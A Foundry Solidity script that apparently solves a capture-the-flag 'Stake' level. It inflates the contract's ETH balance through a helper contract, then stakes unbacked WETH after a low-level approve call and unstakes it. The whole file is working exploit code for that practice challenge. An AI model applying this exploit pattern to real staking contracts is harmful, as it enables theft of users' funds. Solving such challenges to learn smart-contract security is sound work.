// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import "./Stake.sol";

contract Exploit {
    constructor(Stake _stake) payable {
        _stake.StakeETH{value: msg.value}();
    }
}

contract StakeSolver is Script {
    address levelInstance = ""; // input level instance address

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Stake stake = Stake(levelInstance);
        uint256 stakeVal = 0.001 ether + 1;

        // To increase eth balance of Stake contract
        new Exploit{value: stakeVal + 1}(stake);

        // Set player to be a staker for free
        address weth = stake.WETH();
        (bool success,) = weth.call(abi.encodeWithSignature("approve(address,uint256)", address(stake), stakeVal));
        require(success, "Failed to approve amount for spender");
        stake.StakeWETH(stakeVal);
        stake.Unstake(stakeVal);

        vm.stopBroadcast();
    }
}
